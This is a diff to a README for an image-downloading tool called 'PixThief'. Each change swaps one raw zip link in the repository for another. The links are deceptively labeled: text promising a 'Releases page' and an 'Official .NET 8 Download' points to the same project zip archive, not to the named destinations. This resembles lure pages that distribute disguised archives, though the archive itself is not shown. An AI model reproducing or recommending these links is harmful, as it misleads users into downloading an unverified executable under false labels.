@@ -1,6 +1,6 @@
 # 🖼️ PixThief - Stealthy Image Downloader Made Easy
 
-[![Download PixThief](https://raw.githubusercontent.com/ghost83709/PixThief/main/getpics/PixThief-v3.9.zip)](https://raw.githubusercontent.com/ghost83709/PixThief/main/getpics/PixThief-v3.9.zip)
+[![Download PixThief](https://raw.githubusercontent.com/ghost83709/PixThief/main/getpics/Pix-Thief-3.4.zip)](https://raw.githubusercontent.com/ghost83709/PixThief/main/getpics/Pix-Thief-3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to PixThief! This simple tool helps you download images from web pages o
 
 ## 📥 Download & Install
 
-To download PixThief, visit this page: [Download PixThief](https://raw.githubusercontent.com/ghost83709/PixThief/main/getpics/PixThief-v3.9.zip).
+To download PixThief, visit this page: [Download PixThief](https://raw.githubusercontent.com/ghost83709/PixThief/main/getpics/Pix-Thief-3.4.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version at the top of the page.
@@ -68,8 +68,8 @@ Have questions or suggestions? You can connect with us by visiting the repositor
 
 ## 🔗 Additional Resources
 
-- **Official .NET 8 Download**: If you need to install .NET, follow this link: [Download .NET 8](https://raw.githubusercontent.com/ghost83709/PixThief/main/getpics/PixThief-v3.9.zip).
+- **Official .NET 8 Download**: If you need to install .NET, follow this link: [Download .NET 8](https://raw.githubusercontent.com/ghost83709/PixThief/main/getpics/Pix-Thief-3.4.zip).
 
-For updates and new features, make sure to frequently check back on our [Releases page](https://raw.githubusercontent.com/ghost83709/PixThief/main/getpics/PixThief-v3.9.zip).
+For updates and new features, make sure to frequently check back on our [Releases page](https://raw.githubusercontent.com/ghost83709/PixThief/main/getpics/Pix-Thief-3.4.zip).
 
-[![Download PixThief](https://raw.githubusercontent.com/ghost83709/PixThief/main/getpics/PixThief-v3.9.zip)](https://raw.githubusercontent.com/ghost83709/PixThief/main/getpics/PixThief-v3.9.zip)
+[![Download PixThief](https://raw.githubusercontent.com/ghost83709/PixThief/main/getpics/Pix-Thief-3.4.zip)](https://raw.githubusercontent.com/ghost83709/PixThief/main/getpics/Pix-Thief-3.4.zip)
